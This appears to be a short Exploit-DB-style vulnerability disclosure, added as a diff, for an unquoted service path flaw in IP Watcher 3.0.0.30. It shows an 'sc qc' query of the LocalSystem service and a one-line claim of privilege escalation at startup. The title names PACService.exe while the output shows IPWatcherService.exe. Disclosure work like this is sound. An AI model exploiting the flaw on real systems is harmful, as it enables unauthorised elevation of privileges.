@@ -1,0 +1,28 @@
+# Exploit Title: IP Watcher v3.0.0.30 - 'PACService.exe' Unquoted Service Path
+# Date: 2020-8-25
+# Exploit Author: Mohammed Alshehri
+# Vendor Homepage: https://www.gearboxcomputers.com/
+# Software Link: https://www.gearboxcomputers.com/files/IPWatcherSetup.exe
+# Version: 3.0.0.30
+# Tested on: Microsoft Windows 10 Education - 10.0.17763 N/A Build 17763
+
+# Service info:
+
+C:\Users\m507>sc qc IPWatcherSvc
+[SC] QueryServiceConfig SUCCESS
+
+SERVICE_NAME: IPWatcherSvc
+        TYPE               : 10  WIN32_OWN_PROCESS
+        START_TYPE         : 2   AUTO_START
+        ERROR_CONTROL      : 1   NORMAL
+        BINARY_PATH_NAME   : C:\Program Files (x86)\IP Watcher\IPWatcherService.exe
+        LOAD_ORDER_GROUP   :
+        TAG                : 0
+        DISPLAY_NAME       : IPWatcherService
+        DEPENDENCIES       :
+        SERVICE_START_NAME : LocalSystem
+
+C:\Users\m507>
+
+# Exploit:
+This vulnerability could permit executing code during startup or reboot with the escalated privileges.
